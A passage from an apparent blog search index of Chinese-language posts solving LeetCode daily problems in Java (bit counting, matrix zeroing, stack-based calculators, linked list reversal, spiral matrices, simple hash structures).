NestedIterator(nestedList); * while (i.hasNext()) v[f()] = i.next(); */]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>水题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/22]]></title>
    <url>%2Fposts%2Fb4033741%2F</url>
    <content type="text"><![CDATA[题目：191. 位1的个数难度：简单 编写一个函数，输入是一个无符号整数（以二进制串的形式），返回其二进制表达式中数字位数为 ‘1’ 的个数（也被称为汉明重量）。 提示： 请注意，在某些语言（如 Java）中，没有无符号整数类型。在这种情况下，输入和输出都将被指定为有符号整数类型，并且不应影响您的实现，因为无论整数是有符号的还是无符号的，其内部的二进制表示形式都是相同的。 在 Java 中，编译器使用二进制补码记法来表示有符号整数。因此，在上面的 示例 3 中，输入表示有符号整数 -3。 示例 1： 123输入：00000000000000000000000000001011输出：3解释：输入的二进制串 00000000000000000000000000001011 中，共有三位为 &apos;1&apos;。 示例 2： 123输入：00000000000000000000000010000000输出：1解释：输入的二进制串 00000000000000000000000010000000 中，共有一位为 &apos;1&apos;。 示例 3： 123输入：11111111111111111111111111111101输出：31解释：输入的二进制串 11111111111111111111111111111101 中，共有 31 位为 &apos;1&apos;。 提示： 输入必须是长度为 32 的 二进制串 。 进阶 ： 如果多次调用这个函数，你将如何优化你的算法？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/number-of-1-bits/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 位运算性质：n &amp; (n - 1) 可以消去最低位的1 解题代码12345678910111213public class Solution &#123; // you need to treat n as an unsigned value public int hammingWeight(int n) &#123; int ans = 0; while (n != 0) &#123; n = n &amp; (n - 1); ans++; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/21]]></title>
    <url>%2Fposts%2F2d0a66fb%2F</url>
    <content type="text"><![CDATA[题目：73. 矩阵置零难度：中等 给定一个 m x n 的矩阵，如果一个元素为 0 ** ，则将其所在行和列的所有元素都设为 **0 。请使用 原地 算法 。 进阶： 一个直观的解决方案是使用 O(mn) 的额外空间，但这并不是一个好的解决方案。 一个简单的改进方案是使用 O(m + n) 的额外空间，但这仍然不是最好的解决方案。 你能想出一个仅使用常量空间的解决方案吗？ 示例 1： 12输入：matrix = [[1,1,1],[1,0,1],[1,1,1]]输出：[[1,0,1],[0,0,0],[1,0,1]] 示例 2： 12输入：matrix = [[0,1,2,0],[3,4,5,2],[1,3,1,5]]输出：[[0,0,0,0],[0,4,5,0],[0,3,1,0]] 提示： m == matrix.length n == matrix[0].length 1 &lt;= m, n &lt;= 200 -231 &lt;= matrix[i][j] &lt;= 231 - 1 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/set-matrix-zeroes/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 用两个标记变量标记第一行或者第一列是否出现过0，然后使用第一行和第一列标记其他行和其他列是否出现过0 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354class Solution &#123; public void setZeroes(int[][] matrix) &#123; boolean r = false; boolean c = false; int m = matrix.length; int n = matrix[m - 1].length; // 扫描0列有没有0 for (int i = 0;i &lt; n;i++) &#123; if (matrix[0][i] == 0) &#123; c = true; break; &#125; &#125; // 扫描0行有没有0 for (int i = 0;i &lt; m;i++) &#123; if (matrix[i][0] == 0) &#123; r = true; break; &#125; &#125; // 扫描非0行，非0列有没有0，如果有0，将对应的0行和0列元素置0 for (int i = 1;i &lt; m;i++) &#123; for (int j = 1;j &lt; n;j++) &#123; if (matrix[i][j] == 0) &#123; matrix[i][0] = 0; matrix[0][j] = 0; &#125; &#125; &#125; // 根据0列元素置某行全为0，或者根据0行元素置某列全为 for (int i = 1;i &lt; m;i++) &#123; for (int j = 1;j &lt; n;j++) &#123; if (matrix[i][0] == 0 || matrix[0][j] == 0) &#123; matrix[i][j] = 0; &#125; &#125; &#125; // 置0行和0列元素为0 if (r) &#123; for (int i = 0;i &lt; m;i++) &#123; matrix[i][0] = 0; &#125; &#125; if (c) &#123; for (int i = 0;i &lt; n;i++) &#123; matrix[0][i] = 0; &#125; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/20]]></title>
    <url>%2Fposts%2F5a0d566d%2F</url>
    <content type="text"><![CDATA[题目：150. 逆波兰表达式求值难度：中等 根据 逆波兰表示法，求表达式的值。 有效的算符包括 +、-、*、/ 。每个运算对象可以是整数，也可以是另一个逆波兰表达式。 说明： 整数除法只保留整数部分。 给定逆波兰表达式总是有效的。换句话说，表达式总会得出有效数值且不存在除数为 0 的情况。 示例 1： 123输入：tokens = [&quot;2&quot;,&quot;1&quot;,&quot;+&quot;,&quot;3&quot;,&quot;*&quot;]输出：9解释：该算式转化为常见的中缀算术表达式为：((2 + 1) * 3) = 9 示例 2： 123输入：tokens = [&quot;4&quot;,&quot;13&quot;,&quot;5&quot;,&quot;/&quot;,&quot;+&quot;]输出：6解释：该算式转化为常见的中缀算术表达式为：(4 + (13 / 5)) = 6 示例 3： 1234567891011输入：tokens = [&quot;10&quot;,&quot;6&quot;,&quot;9&quot;,&quot;3&quot;,&quot;+&quot;,&quot;-11&quot;,&quot;*&quot;,&quot;/&quot;,&quot;*&quot;,&quot;17&quot;,&quot;+&quot;,&quot;5&quot;,&quot;+&quot;]输出：22解释：该算式转化为常见的中缀算术表达式为： ((10 * (6 / ((9 + 3) * -11))) + 17) + 5= ((10 * (6 / (12 * -11))) + 17) + 5= ((10 * (6 / -132)) + 17) + 5= ((10 * 0) + 17) + 5= (0 + 17) + 5= 17 + 5= 22 提示： 1 &lt;= tokens.length &lt;= 104 tokens[i] 要么是一个算符（”+”、”-“、”*” 或 “/“），要么是一个在范围 [-200, 200] 内的整数 逆波兰表达式： 逆波兰表达式是一种后缀表达式，所谓后缀就是指算符写在后面。 平常使用的算式则是一种中缀表达式，如 ( 1 + 2 ) * ( 3 + 4 ) 。 该算式的逆波兰表达式写法为 ( ( 1 2 + ) ( 3 4 + ) * ) 。 逆波兰表达式主要有以下两个优点： 去掉括号后表达式无歧义，上式即便写成 1 2 + 3 4 + * 也可以依据次序计算出正确结果。 适合用栈操作运算：遇到数字则入栈；遇到算符则取出栈顶两个数字进行计算，并将结果压入栈中。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/evaluate-reverse-polish-notation/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 题目已经告诉我们该怎么做了 这两天怎么都是水题 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142class Solution &#123; public int evalRPN(String[] tokens) &#123; Stack&lt;Integer&gt; s = new Stack&lt;&gt;(); for (String t : tokens) &#123; switch (t) &#123; case "+": &#123; int a = s.pop(); int b = s.pop(); s.push(a + b); &#125; break; case "-": &#123; int a = s.pop(); int b = s.pop(); s.push(b - a); &#125; break; case "*": &#123; int a = s.pop(); int b = s.pop(); s.push(a * b); &#125; break; case "/": &#123; int a = s.pop(); int b = s.pop(); s.push(b / a); &#125; break; default: s.push(Integer.valueOf(t)); &#125; &#125; return s.pop(); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/19]]></title>
    <url>%2Fposts%2F8fcbd0a%2F</url>
    <content type="text"><![CDATA[题目：1603. 设计停车系统难度：简单 请你给一个停车场设计一个停车系统。停车场总共有三种不同大小的车位：大，中和小，每种尺寸分别有固定数目的车位。 请你实现 ParkingSystem 类： ParkingSystem(int big, int medium, int small) 初始化 ParkingSystem 类，三个参数分别对应每种停车位的数目。 bool addCar(int carType) 检查是否有 carType 对应的停车位。 carType 有三种类型：大，中，小，分别用数字 1， 2 和 3 表示。 一辆车只能停在 carType 对应尺寸的停车位中。如果没有空车位，请返回 false ，否则将该车停入车位并返回 true 。 示例 1： 123456789101112输入：[&quot;ParkingSystem&quot;, &quot;addCar&quot;, &quot;addCar&quot;, &quot;addCar&quot;, &quot;addCar&quot;][[1, 1, 0], [1], [2], [3], [1]]输出：[null, true, true, false, false]解释：ParkingSystem parkingSystem = new ParkingSystem(1, 1, 0);parkingSystem.addCar(1); // 返回 true ，因为有 1 个空的大车位parkingSystem.addCar(2); // 返回 true ，因为有 1 个空的中车位parkingSystem.addCar(3); // 返回 false ，因为没有空的小车位parkingSystem.addCar(1); // 返回 false ，因为没有空的大车位，唯一一个大车位已经被占据了 提示： 0 &lt;= big, medium, small &lt;= 1000 carType 取值为 1， 2 或 3 最多会调用 addCar 函数 1000 次 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/design-parking-system/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 水题不需要解释 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142class ParkingSystem &#123; private int big; private int medium; private int small; public ParkingSystem(int big, int medium, int small) &#123; this.big = big; this.medium = medium; this.small = small; &#125; public boolean addCar(int carType) &#123; switch (carType) &#123; case 1: if (this.big &lt;= 0) &#123; return false; &#125; this.big--; break; case 2: if (this.medium &lt;= 0) &#123; return false; &#125; this.medium--; break; case 3: if (this.small &lt;= 0) &#123; return false; &#125; this.small--; break; &#125; return true; &#125;&#125;/** * Your ParkingSystem object will be instantiated and called as such: * ParkingSystem obj = new ParkingSystem(big, medium, small); * boolean param_1 = obj.addCar(carType); */]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>水题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/18]]></title>
    <url>%2Fposts%2F7ffb8d9c%2F</url>
    <content type="text"><![CDATA[题目：92. 反转链表 II难度：中等 给你单链表的头节点 head 和两个整数 left 和 right ，其中 left &lt;= right 。请你反转从位置 left 到位置 right 的链表节点，返回 反转后的链表 。 示例 1： 12输入：head = [1,2,3,4,5], left = 2, right = 4输出：[1,4,3,2,5] 示例 2： 12输入：head = [5], left = 1, right = 1输出：[5] 提示： 链表中节点数目为 n 1 &lt;= n &lt;= 500 -500 &lt;= Node.val &lt;= 500 1 &lt;= left &lt;= right &lt;= n 进阶： 你可以使用一趟扫描完成反转吗？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/reverse-linked-list-ii/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 看代码中注释 解题代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode() &#123;&#125; * ListNode(int val) &#123; this.val = val; &#125; * ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125; * &#125; */class Solution &#123; public ListNode reverseBetween(ListNode head, int left, int right) &#123; ListNode vHead = new ListNode(-1,head); ListNode pre = vHead; for (int i = 0;i &lt; left - 1;i++) &#123; pre = pre.next; &#125; ListNode l = pre.next; ListNode last = pre; for (int i = 0;i &lt; right - left + 1;i++) &#123; last = last.next; &#125; ListNode r = last; last = r.next; // 断链，避免链表中出现环 pre.next = null; r.next = null; // 反转 ListNode cur = l; ListNode p = null; while (cur != null) &#123; // 先保存当前节点的下一个节点 ListNode next = cur.next; // 当前节点的下一个节点指向上一个节点 cur.next = p; // 移动上一个节点，进入下一步操作 p = cur; // 当前节点往后移动 cur = next; &#125; // 反转完成之后最右侧的节点会变换为最前面的节点，最左侧的节点变为最后面的节点 pre.next = r; l.next = last; return vHead.next; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/16]]></title>
    <url>%2Fposts%2F9843a09b%2F</url>
    <content type="text"><![CDATA[题目：59. 螺旋矩阵 II难度：中等 给你一个正整数 n ，生成一个包含 1 到 n2 所有元素，且元素按顺时针顺序螺旋排列的 n x n 正方形矩阵 matrix 。 示例 1： 12输入：n = 3输出：[[1,2,3],[8,9,4],[7,6,5]] 示例 2： 12输入：n = 1输出：[[1]] 提示： 1 &lt;= n &lt;= 20 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/spiral-matrix-ii/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 模拟按圈填的过程即可 解题代码12345678910111213141516171819202122232425262728293031323334353637383940414243class Solution &#123; public int[][] generateMatrix(int n) &#123; int[][] ans = new int[n][n]; int t = n * n; int i = 1; int x = 0; int y = 0; while (i &lt;= t) &#123; while (y &lt; n &amp;&amp; ans[x][y] == 0) &#123; ans[x][y] = i++; y++; &#125; y = y - 1; x = x + 1; while (x &lt; n &amp;&amp; ans[x][y] == 0) &#123; ans[x][y] = i++; x++; &#125; y = y - 1; x = x - 1; while (y &gt;= 0 &amp;&amp; ans[x][y] == 0) &#123; ans[x][y] = i++; y--; &#125; y = y + 1; x = x - 1; while (x &gt;= 0 &amp;&amp; ans[x][y] == 0) &#123; ans[x][y] = i++; x--; &#125; x = x + 1; y = y + 1; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/15]]></title>
    <url>%2Fposts%2F14af121%2F</url>
    <content type="text"><![CDATA[题目：54. 螺旋矩阵难度：中等 给你一个 m 行 n 列的矩阵 matrix ，请按照 顺时针螺旋顺序 ，返回矩阵中的所有元素。 示例 1： 12输入：matrix = [[1,2,3],[4,5,6],[7,8,9]]输出：[1,2,3,6,9,8,7,4,5] 示例 2： 12输入：matrix = [[1,2,3,4],[5,6,7,8],[9,10,11,12]]输出：[1,2,3,4,8,12,11,10,9,5,6,7] 提示： m == matrix.length n == matrix[i].length 1 &lt;= m, n &lt;= 10 -100 &lt;= matrix[i][j] &lt;= 100 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/spiral-matrix/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 按圈遍历数组就可以了 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263class Solution &#123; public List&lt;Integer&gt; spiralOrder(int[][] matrix) &#123; int m = matrix.length; int n = matrix[0].length; dfs(0,0,matrix); return ans; &#125; List&lt;Integer&gt; ans = new ArrayList&lt;&gt;(); private void dfs(int x,int y,int[][] matrix) &#123; int m = matrix.length; int n = matrix[m - 1].length; if (ans.size() &gt;= m * n) &#123; return; &#125; int i = y; int j = x; for (;i &lt; n - x;i++) &#123; ans.add(matrix[j][i]); if (ans.size() &gt;= m * n) &#123; return; &#125; &#125; i = i - 1; j = j + 1; for (;j &lt; m - y;j++) &#123; ans.add(matrix[j][i]); if (ans.size() &gt;= m * n) &#123; return; &#125; &#125; j = j - 1; i = i - 1; for (;i &gt;= x;i--) &#123; ans.add(matrix[j][i]); if (ans.size() &gt;= m * n) &#123; return; &#125; &#125; i = i + 1; j = j - 1; for (;j &gt; y;j--) &#123; ans.add(matrix[j][i]); if (ans.size() &gt;= m * n) &#123; return; &#125; &#125; if (ans.size() &lt; m * n &amp;&amp; x + 1 &lt; m &amp;&amp; y + 1 &lt; n) &#123; dfs(x + 1,y + 1,matrix); &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>数组</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/14]]></title>
    <url>%2Fposts%2F764dc1b7%2F</url>
    <content type="text"><![CDATA[题目：706. 设计哈希映射难度：简单 不使用任何内建的哈希表库设计一个哈希映射（HashMap）。 实现 MyHashMap 类： MyHashMap() 用空映射初始化对象 void put(int key, int value) 向 HashMap 插入一个键值对 (key, value) 。如果 key 已经存在于映射中，则更新其对应的值 value 。 int get(int key) 返回特定的 key 所映射的 value ；如果映射中不包含 key 的映射，返回 -1 。 void remove(key) 如果映射中存在 key 的映射，则移除 key 和它所对应的 value 。 示例： 12345678910111213141516输入：[&quot;MyHashMap&quot;, &quot;put&quot;, &quot;put&quot;, &quot;get&quot;, &quot;get&quot;, &quot;put&quot;, &quot;get&quot;, &quot;remove&quot;, &quot;get&quot;][[], [1, 1], [2, 2], [1], [3], [2, 1], [2], [2], [2]]输出：[null, null, null, 1, -1, null, 1, null, -1]解释：MyHashMap myHashMap = new MyHashMap();myHashMap.put(1, 1); // myHashMap 现在为 [[1,1]]myHashMap.put(2, 2); // myHashMap 现在为 [[1,1], [2,2]]myHashMap.get(1); // 返回 1 ，myHashMap 现在为 [[1,1], [2,2]]myHashMap.get(3); // 返回 -1（未找到），myHashMap 现在为 [[1,1], [2,2]]myHashMap.put(2, 1); // myHashMap 现在为 [[1,1], [2,1]]（更新已有的值）myHashMap.get(2); // 返回 1 ，myHashMap 现在为 [[1,1], [2,1]]myHashMap.remove(2); // 删除键为 2 的数据，myHashMap 现在为 [[1,1]]myHashMap.get(2); // 返回 -1（未找到），myHashMap 现在为 [[1,1]] 提示： 0 &lt;= key, value &lt;= 106 最多调用 104 次 put、get 和 remove 方法 进阶： 你能否不使用内置的 HashMap 库解决此问题？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/design-hashmap/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 只要我空间开得足够大，就不需要解决冲突问题 解题代码123456789101112131415161718192021222324252627282930class MyHashMap &#123; int[] map = new int[1000001]; /** Initialize your data structure here. */ public MyHashMap() &#123; Arrays.fill(map,-1); &#125; /** value will always be non-negative. */ public void put(int key, int value) &#123; map[key] = value; &#125; /** Returns the value to which the specified key is mapped, or -1 if this map contains no mapping for the key */ public int get(int key) &#123; return map[key]; &#125; /** Removes the mapping of the specified value key if this map contains a mapping for the key */ public void remove(int key) &#123; map[key] = -1; &#125;&#125;/** * Your MyHashMap object will be instantiated and called as such: * MyHashMap obj = new MyHashMap(); * obj.put(key,value); * int param_2 = obj.get(key); * obj.remove(key); */]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>哈希表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/13]]></title>
    <url>%2Fposts%2Fe8295414%2F</url>
    <content type="text"><![CDATA[题目：705. 设计哈希集合难度：简单 不使用任何内建的哈希表库设计一个哈希集合（HashSet）。 实现 MyHashSet 类： void add(key) 向哈希集合中插入值 key 。 bool contains(key) 返回哈希集合中是否存在这个值 key 。 void remove(key) 将给定值 key 从哈希集合中删除。如果哈希集合中没有这个值，什么也不做。 示例： 12345678910111213141516输入：[&quot;MyHashSet&quot;, &quot;add&quot;, &quot;add&quot;, &quot;contains&quot;, &quot;contains&quot;, &quot;add&quot;, &quot;contains&quot;, &quot;remove&quot;, &quot;contains&quot;][[], [1], [2], [1], [3], [2], [2], [2], [2]]输出：[null, null, null, true, false, null, true, null, false]解释：MyHashSet myHashSet = new MyHashSet();myHashSet.add(1); // set = [1]myHashSet.add(2); // set = [1, 2]myHashSet.contains(1); // 返回 TruemyHashSet.contains(3); // 返回 False ，（未找到）myHashSet.add(2); // set = [1, 2]myHashSet.contains(2); // 返回 TruemyHashSet.remove(2); // set = [1]myHashSet.contains(2); // 返回 False ，（已移除） 提示： 0 &lt;= key &lt;= 106 最多调用 104 次 add、remove 和 contains 。 进阶： 你可以不使用内建的哈希集合库解决此问题吗？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/design-hashset/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 只要我空间开得足够大，就不需要解决冲突问题 解题代码12345678910111213141516171819202122232425262728class MyHashSet &#123; int map[] = new int[1000001]; /** Initialize your data structure here. */ public MyHashSet() &#123; &#125; public void add(int key) &#123; map[key] = 1; &#125; public void remove(int key) &#123; map[key] = 0; &#125; /** Returns true if this set contains the specified element */ public boolean contains(int key) &#123; return map[key] == 1; &#125;&#125;/** * Your MyHashSet object will be instantiated and called as such: * MyHashSet obj = new MyHashSet(); * obj.add(key); * obj.remove(key); * boolean param_3 = obj.contains(key); */]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>哈希表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/12]]></title>
    <url>%2Fposts%2F9f2e6482%2F</url>
    <content type="text"><![CDATA[题目：331. 验证二叉树的前序序列化难度：中等 序列化二叉树的一种方法是使用前序遍历。当我们遇到一个非空节点时，我们可以记录下这个节点的值。如果它是一个空节点，我们可以使用一个标记值记录，例如 #。 1234567 _9_ / \ 3 2 / \ / \ 4 1 # 6/ \ / \ / \# # # # # # 例如，上面的二叉树可以被序列化为字符串 “9,3,4,#,#,1,#,#,2,#,6,#,#”，其中 # 代表一个空节点。 给定一串以逗号分隔的序列，验证它是否是正确的二叉树的前序序列化。编写一个在不重构树的条件下的可行算法。 每个以逗号分隔的字符或为一个整数或为一个表示 null 指针的 ‘#’ 。 你可以认为输入格式总是有效的，例如它永远不会包含两个连续的逗号，比如 “1,,3” 。 示例 1: 12输入: &quot;9,3,4,#,#,1,#,#,2,#,6,#,#&quot;输出: true 示例 2: 12输入: &quot;1,#&quot;输出: false 示例 3: 12输入: &quot;9,#,#,1&quot;输出: false 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/verify-preorder-serialization-of-a-binary-tree/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 栈 解题代码123456789101112131415161718192021222324252627282930313233class Solution &#123; public boolean isValidSerialization(String preorder) &#123; Stack&lt;Integer&gt; s = new Stack&lt;&gt;(); s.push(1); for (int i = 0;i &lt; preorder.length();i++) &#123; if (s.isEmpty()) &#123; return false; &#125; char ch = preorder.charAt(i); if (ch == ',') &#123; continue; &#125; else if (ch == '#') &#123; int top = s.pop() - 1; if (top &gt; 0) &#123; s.push(top); &#125; &#125; else &#123; while (i &lt; preorder.length() &amp;&amp; preorder.charAt(i) != ',') &#123; i++; &#125; int top = s.pop() - 1; if (top &gt; 0) &#123; s.push(top); &#125; s.push(2); &#125; &#125; return s.isEmpty(); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/11]]></title>
    <url>%2Fposts%2F6273538%2F</url>
    <content type="text"><![CDATA[题目：227. 基本计算器 II难度：中等 给你一个字符串表达式 s ，请你实现一个基本计算器来计算并返回它的值。 整数除法仅保留整数部分。 示例 1： 12输入：s = &quot;3+2*2&quot;输出：7 示例 2： 12输入：s = &quot; 3/2 &quot;输出：1 示例 3： 12输入：s = &quot; 3+5 / 2 &quot;输出：5 提示： 1 &lt;= s.length &lt;= 3 * 105 s 由整数和算符 (‘+’, ‘-‘, ‘*’, ‘/‘) 组成，中间由一些空格隔开 s 表示一个 有效表达式 表达式中的所有整数都是非负整数，且在范围 [0, 231 - 1] 内 题目数据保证答案是一个 32-bit 整数 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/basic-calculator-ii/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 还是用栈模拟运算过程 解题代码12345678910111213141516171819202122232425262728293031323334353637383940414243class Solution &#123; public int calculate(String s) &#123; int ans = 0; int num = 0; char lastOp = '+'; Stack&lt;Integer&gt; stack = new Stack&lt;&gt;(); for (int i = 0;i &lt; s.length();i++) &#123; char ch = s.charAt(i); if (Character.isDigit(ch)) &#123; num = num * 10 + (ch - '0'); &#125; else if (ch != ' ') &#123; calc(lastOp,num,stack); num = 0; lastOp = ch; &#125; &#125; calc(lastOp,num,stack); while (!stack.isEmpty()) &#123; ans += stack.pop(); &#125; return ans; &#125; public void calc(char lastOp,int num,Stack&lt;Integer&gt; stack) &#123; switch (lastOp) &#123; case '+': stack.push(num); break; case '-': stack.push(-num); break; case '*': stack.push(stack.pop() * num); break; case '/': stack.push(stack.pop() / num); break; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/10]]></title>
    <url>%2Fposts%2F712005ae%2F</url>
    <content type="text"><![CDATA[题目：224. 基本计算器难度：困难 实现一个基本的计算器来计算一个简单的字符串表达式 s 的值。 示例 1： 12输入：s = &quot;1 + 1&quot;输出：2 示例 2： 12输入：s = &quot; 2-1 + 2 &quot;输出：3 示例 3： 12输入：s = &quot;(1+(4+5+2)-3)+(6+8)&quot;输出：23 提示： 1 &lt;= s.length &lt;= 3 * 105 s 由数字、’+’、’-‘、’(‘、’)’、和 ‘ ‘ 组成 s 表示一个有效的表达式 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/basic-calculator/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 用栈模拟运算过程 解题代码12345678910111213141516171819202122232425262728293031323334353637383940414243class Solution &#123; public int calculate(String s) &#123; int ans = 0; int num = 0; int sign = 1; Stack&lt;Integer&gt; stack = new Stack&lt;&gt;(); for (int i = 0;i &lt; s.length();i++) &#123; char ch = s.charAt(i); if (Character.isDigit(ch)) &#123; num = num * 10 + (ch - '0'); &#125; else &#123; switch (ch) &#123; case '+': ans += sign * num; num = 0; sign = 1; break; case '-': ans += sign * num; num = 0; sign = -1; break; case '(': stack.push(ans); stack.push(sign); ans = 0; sign = 1; break; case ')': ans += sign * num; ans *= stack.pop(); ans += stack.pop(); num = 0; break; &#125; &#125; &#125; ans += sign * num; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/9]]></title>
    <url>%2Fposts%2F9031df60%2F</url>
    <content type="text"><![CDATA[题目：1047. 删除字符串中的所有相邻重复项难度：简单 给出由小写字母组成的字符串 S， 重复项删除操作 会选择两个相邻且相同的字母，并删除它们。 在 S 上反复执行重复项删除操作，直到无法继续删除。 在完成所有重复项删除操作后返回最终的字符串。答案保证唯一。 示例： 1234输入：&quot;abbaca&quot;输出：&quot;ca&quot;解释：例如，在 &quot;abbaca&quot; 中，我们可以删除 &quot;bb&quot; 由于两字母相邻且相同，这是此时唯一可以执行删除操作的重复项。之后我们得到字符串 &quot;aaca&quot;，其中又只有 &quot;aa&quot; 可以执行重复项删除操作，所以最后的字符串为 &quot;ca&quot;。 提示： 1 &lt;= S.length &lt;= 20000 S 仅由小写英文字母组成。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/remove-all-adjacent-duplicates-in-string/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 把StringBuilder当栈使用 解题代码123456789101112131415class Solution &#123; public String removeDuplicates(String S) &#123; StringBuilder builder = new StringBuilder(); for (int i = 0;i &lt; S.length();i++) &#123; if (builder.length() &gt; 0 &amp;&amp; builder.charAt(builder.length() - 1) == S.charAt(i)) &#123; builder.deleteCharAt(builder.length() - 1); &#125; else &#123; builder.append(S.charAt(i)); &#125; &#125; return builder.toString(); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/6]]></title>
    <url>%2Fposts%2F8ec2f1%2F</url>
